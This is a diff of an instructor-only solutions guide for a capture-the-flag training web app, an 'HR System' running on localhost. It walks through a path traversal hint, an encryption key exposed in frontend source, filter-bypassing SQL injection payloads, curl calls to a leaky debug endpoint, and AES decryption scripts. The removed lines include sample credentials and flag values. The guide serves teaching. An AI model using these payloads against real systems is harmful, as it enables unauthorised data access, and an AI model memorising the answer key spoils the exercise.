@@ -1,34 +1,66 @@
-# CTF 3: HR System Solution
+# CTF 3 -- Solutions
 
-## Credentials
-- `abcd12` / `RVIFLBfM`
-- `efgh34` / `bcgxO1ZkSle`
-- `ijkl56` / `kH0g5imYtZ`
+> **Instructors/markers only.** Do not distribute to participants.
 
 ---
 
-## Flag 1: Path Traversal
+## Credentials
 
-1. Login at http://localhost:5174
+- See `credentials.json` for generated per-user passwords.
+- Usernames follow the `abcd12` format (4 letters + 2 digits).
+- Generate credentials with: `cd CTFs/challenge-generation && node chgen_ctf3.js abcd12 efgh34`
+
+---
+
+## Flag Location
+
+Each user has two types of flags stored in `flags.json`:
+- `flag_api` -- returned by the `/api/flag` endpoint and shown on the `/flag` page
+- `flag_decrypt` -- encrypted with AES-256-CBC, placed in the user's bot employee notes
+
+Flag format: `durham-hr{<token>_<username>}`
+
+---
+
+## Overview
+
+The HR System CTF includes:
+
+- A login page (`/login`)
+- A dashboard and employee directory
+- A hidden `/flag` page (discoverable via path traversal hint)
+- A debug API endpoint that leaks credentials
+- Per-user bot employees with encrypted flag notes (discoverable via SQL injection)
+
+To solve the CTF, students exploit multiple vulnerabilities to collect 3 per-user flags.
+
+---
+
+## Flag 1: Path Traversal (Per-User)
+
+### Steps
+
+1. Login at http://localhost:5174 with credentials from `credentials.json`
 2. Inspect Dashboard page source (Ctrl+U or View Source)
 3. Find HTML comment: `<!-- TODO: Fix broken admin link - /admin/../../flag should redirect properly -->`
 4. Navigate to: `http://localhost:5174/flag`
+5. The page fetches the flag from the backend API `/api/flag` using the player's JWT
 
-**Flag:** `durham-hr{w3lc0m3_t0_hr_syst3m}`
+**Flag:** `durham-hr{..._<username>}` (per-user, from `flags.json` `flag_api`)
 
 ---
 
-## Flag 2: Source Code Discovery
+## Flag 2: SQL Injection + Source Code Key + Decryption (Per-User)
 
-1. Open DevTools (F12) → Sources tab
+This flag requires chaining three vulnerabilities together.
+
+### Step 1: Discover the encryption key
+
+1. Open DevTools (F12) -> Sources tab
 2. Navigate to: `src/utils/legacyAuth.ts`
 3. Find key in comments: `CTF_2026_SECRET_KEY_XJ9K2L`
 
-**Flag 2 (Decryption Key):** `CTF_2026_SECRET_KEY_XJ9K2L`
-
----
-
-## Flag 3: SQL Injection
+### Step 2: SQL injection to find hidden bot employee
 
 The employee search filters basic injection like `' OR 1=1--` but misses no-space variants.
 
@@ -38,58 +70,53 @@ The employee search filters basic injection like `' OR 1=1--` but misses no-spac
 - `'OR 1=1--` (no space after quote)
 - `'/**/OR/**/1=1--` (comment-based)
 
-**Steps:**
-
 1. Go to Employees page
 2. Enter payload in search: `'OR 1=1--`
-3. Returns all 4 employees including FLAG012:
+3. Returns all employees including the hidden bot employees (e.g., `BOT001`):
 
 ```json
 {
-  "employee_id": "FLAG012",
-  "username": "flag12",
-  "notes": "AES-256-CBC encrypted data: 2Mc2NehcojWoJDxQfeZmAQ==:n9huRl/J+s87oF1G8uJD5emX7W5XH0O7Jh+vL1Eq9v3xtB/FMjflNbU2gm8nk819 (hint: check legacy code for the key)"
+  "employee_id": "BOT001",
+  "notes": "AES-256-CBC encrypted data: <iv>:<ciphertext> (hint: check legacy code for the key)"
 }
 ```
 
----
+Each player has their own bot employee (`<username>-bot`) with their own encrypted flag.
 
-## Flag 4: API Exploitation + Decryption
-
-### Step 1: Get Full Credentials
+### Step 3: Get encrypted data via debug endpoint
 
 **Hint in:** `frontend/src/api/client.ts` shows debug endpoint
 
-**Exploit:**
 ```bash
 # Get token
 TOKEN=$(curl -s -X POST http://127.0.0.1:8004/api/auth/login \
   -H "Content-Type: application/json" \
-  -d '{"username":"abcd12","password":"RVIFLBfM"}' \
+  -d '{"username":"abcd12","password":"<password>"}' \
   | grep -o '"token":"[^"]*"' | cut -d'"' -f4)
 
-# Query debug endpoint
-curl "http://127.0.0.1:8004/api/debug/config?user=flag12" \
+# Query debug endpoint for your bot
+curl "http://127.0.0.1:8004/api/debug/config?user=abcd12-bot" \
   -H "Authorization: Bearer $TOKEN"
 ```
 
 **Response:**
 ```json
 {
-  "user": "flag12",
+  "user": "abcd12-bot",
   "config": {
-    "notes": "AES-256-CBC encrypted data: 2Mc2NehcojWoJDxQfeZmAQ==:n9huRl/J+s87oF1G8uJD5emX7W5XH0O7Jh+vL1Eq9v3xtB/FMjflNbU2gm8nk819 (hint: check legacy code for the key)"
+    "notes": "AES-256-CBC encrypted data: <iv>:<ciphertext> (hint: check legacy code for the key)",
+    "owner": "abcd12"
   }
 }
 ```
 
-### Step 2: Decrypt Final Flag
+### Step 4: Decrypt the flag
 
 **Node.js:**
 ```javascript
 const crypto = require('crypto');
 
-const encrypted = '2Mc2NehcojWoJDxQfeZmAQ==:n9huRl/J+s87oF1G8uJD5emX7W5XH0O7Jh+vL1Eq9v3xtB/FMjflNbU2gm8nk819';
+const encrypted = '<iv_base64>:<ciphertext_base64>';  // from bot notes
 const key_passphrase = 'CTF_2026_SECRET_KEY_XJ9K2L';
 
 const [ivBase64, ciphertext] = encrypted.split(':');
@@ -107,7 +134,7 @@ console.log(decrypted);
 from Crypto.Cipher import AES
 import hashlib, base64
 
-encrypted = '2Mc2NehcojWoJDxQfeZmAQ==:n9huRl/J+s87oF1G8uJD5emX7W5XH0O7Jh+vL1Eq9v3xtB/FMjflNbU2gm8nk819'
+encrypted = '<iv_base64>:<ciphertext_base64>'  # from bot notes
 key_passphrase = 'CTF_2026_SECRET_KEY_XJ9K2L'
 
 iv_b64, ciphertext = encrypted.split(':')
@@ -115,72 +142,51 @@ key = hashlib.sha256(key_passphrase.encode()).digest()
 iv = base64.b64decode(iv_b64)
 cipher = AES.new(key, AES.MODE_CBC, iv)
 decrypted = cipher.decrypt(base64.b64decode(ciphertext))
-print(decrypted.decode('utf-8').rstrip('\x00'))
-```
-
-**Flag 4:** `durham-hr{c3f8a12b4d7e9056fa21_flag12}`
-
----
-
-## Summary
-
-| Flag | Technique | Result |
-|------|-----------|--------|
-| 1 | Path traversal | `durham-hr{w3lc0m3_t0_hr_syst3m}` |
-| 2 | Source code inspection | `CTF_2026_SECRET_KEY_XJ9K2L` |
-| 3 | SQL injection | Found FLAG012 + encrypted data |
-| 4 | Debug API + AES decrypt | `durham-hr{c3f8a12b4d7e9056fa21_flag12}` |
-```
-
-**Decryption Script (Python):**
-```python
-from Crypto.Cipher import AES
-from Crypto.Hash import SHA256
-import base64
-
-encrypted_data = '2Mc2NehcojWoJDxQfeZmAQ==:n9huRl/J+s87oF1G8uJD5emX7W5XH0O7Jh+vL1Eq9v3xtB/FMjflNbU2gm8nk819'
-passphrase = 'CTF_2026_SECRET_KEY_XJ9K2L'
-
-iv_b64, ciphertext_b64 = encrypted_data.split(':')
-iv = base64.b64decode(iv_b64)
-ciphertext = base64.b64decode(ciphertext_b64)
-
-# Derive key using SHA256
-key = SHA256.new(passphrase.encode()).digest()
-
-cipher = AES.new(key, AES.MODE_CBC, iv)
-decrypted = cipher.decrypt(ciphertext)
 
 # Remove PKCS7 padding
 pad_len = decrypted[-1]
 decrypted = decrypted[:-pad_len].decode('utf-8')
-
-print('Decrypted flag:', decrypted)
+print(decrypted)
 ```
 
-**Online Alternative:**
-Use CyberChef with:
-1. From Base64 (for IV and ciphertext separately)
-2. AES Decrypt with CBC mode
-3. Key: SHA256 hash of `CTF_2026_SECRET_KEY_XJ9K2L`
+**Flag:** `durham-hr{..._<username>}` (per-user, from `flags.json` `flag_decrypt`)
 
-## Final Flag
+---
 
+## Flag 3: API Flag Endpoint (Per-User)
+
+```bash
+curl "http://127.0.0.1:8004/api/flag" \
+  -H "Authorization: Bearer $TOKEN"
 ```
-durham-hr{c3f8a12b4d7e9056fa21_flag12}
+
+**Response:**
+```json
+{
+  "flag": "durham-hr{..._<username>}"
+}
 ```
 
-## Summary of Techniques Used
+**Flag:** Same as Flag 1 (`flag_api` value from `flags.json`)
 
-| Stage | Technique | Skill Level |
-|-------|-----------|-------------|
-| 1 | Basic authentication | Beginner |
-| 2 | Source code analysis | Beginner-Intermediate |
-| 3 | SQL Injection (filter bypass) | Intermediate-Advanced |
-| 4 | AES-256-CBC decryption | Intermediate |
+---
 
-## Key Vulnerabilities
+## Vulnerabilities Exploited
 
-1. **Information Disclosure**: Encryption key stored in frontend source code
-2. **SQL Injection**: Bypassable filter using no-space technique
-3. **Hidden Data**: Employee visible in count but filtered from list
+| Vulnerability | Location | Description |
+|---------------|----------|-------------|
+| Path traversal hint | Dashboard HTML source | Comment reveals hidden `/flag` route |
+| Information disclosure | `legacyAuth.ts` | Encryption key in frontend source code |
+| SQL injection | `EmployeeController::index()` | Bypassable filter using no-space technique |
+| Debug API leak | `DebugController::getUserConfig()` | Returns raw credentials without proper authorization |
+| Insecure encryption | Bot employee notes | AES-256-CBC with key discoverable in source |
+
+---
+
+## Reset
+
+```bash
+docker compose down -v && docker compose up --build
+```
+
+This re-runs migrations and re-seeds from the mounted `flags.json` and `credentials.json`.
